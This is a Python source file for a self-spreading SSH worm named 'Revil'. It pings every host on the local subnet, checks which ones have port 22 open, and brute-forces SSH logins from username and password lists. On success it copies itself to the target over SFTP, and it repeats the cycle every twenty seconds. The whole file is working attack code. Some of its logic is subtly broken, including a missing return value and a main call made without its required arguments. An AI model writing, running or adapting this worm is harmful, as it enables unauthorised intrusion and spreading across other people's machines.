###############################
# Project: Revil              #
# Author: harimtim            #
# Date: 04.08.2024            #
# Status: Development         #
###############################


import netifaces
import socket
from threading import Thread, Lock
from ping3 import ping
import paramiko
from sys import argv
import os
import time

#-------------CONFIG--------------#
FILE = argv[0]
FILENAME = os.path.basename(FILE)
#---------------------------------#


def get_online_devices_in_local_network():
    threads = []
    lock = Lock()
    gateway = netifaces.gateways().get("default", {}).get(netifaces.AF_INET, None)
    if not gateway:
        return []
    base_ip = ".".join(gateway[0].split(".")[:-1]) + "."
    online = []
    def ping_ip(ip):
        response = ping(ip, timeout=1)
        if response is not None:
            with lock:
                online.append(ip)
    for i in range(256):
        ip = base_ip + str(i)
        t = Thread(target=ping_ip, args=(ip,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    return online



def scan_port(
    host: str,
    port: int,
):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((host, port))
    if result == 0:
        return True  
    else:
        return False
    
    
def put_file_via_ssh(host: str, user: str, password: str, file: str = FILE, destination: str = FILENAME):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, 22, user, password)
        sftp = client.open_sftp()
        sftp.put(file, destination)

        return True
    except:
        return False


def get_targets(
    hosts: list, 
    port: int
):
    targets = []
    for host in hosts:
        if scan_port(host, port):
            targets.append(host)
    return targets


def bruteforce_ssh(host: str, user: str, passwords: list):
    #print(f"\n[+] Bruteforcing: {host} | Username: {user}")

    for item in passwords:
        password = item.strip()
        #print(f"[?] Trying Passwort: {password}")

        if put_file_via_ssh(
            host=host,
            user=user,
            password=password 
        ):
            print(f"Worm moved via Network to {user}@{host} | Password: {password} ")
            break
        else:
            pass

def network_ssh_loop(usernames: list, passwords: list):
    while True:
        online = get_online_devices_in_local_network()
        ssh_targets = get_targets(online, port=22)
        print(f"Worm found {len(ssh_targets)} SSH Target(s): {ssh_targets}")
        for target in ssh_targets:
            for username in usernames:
                if bruteforce_ssh(host=target, user=username, passwords=passwords):
                    break
        time.sleep(20)


def ssh_wormhole(usernames:list, passwords:list):
    t = Thread(target=network_ssh_loop, args=(usernames, passwords))
    t.start()
    print("Wormhole: SSH successfully started")

if __name__ == "__main__":
    ssh_wormhole()
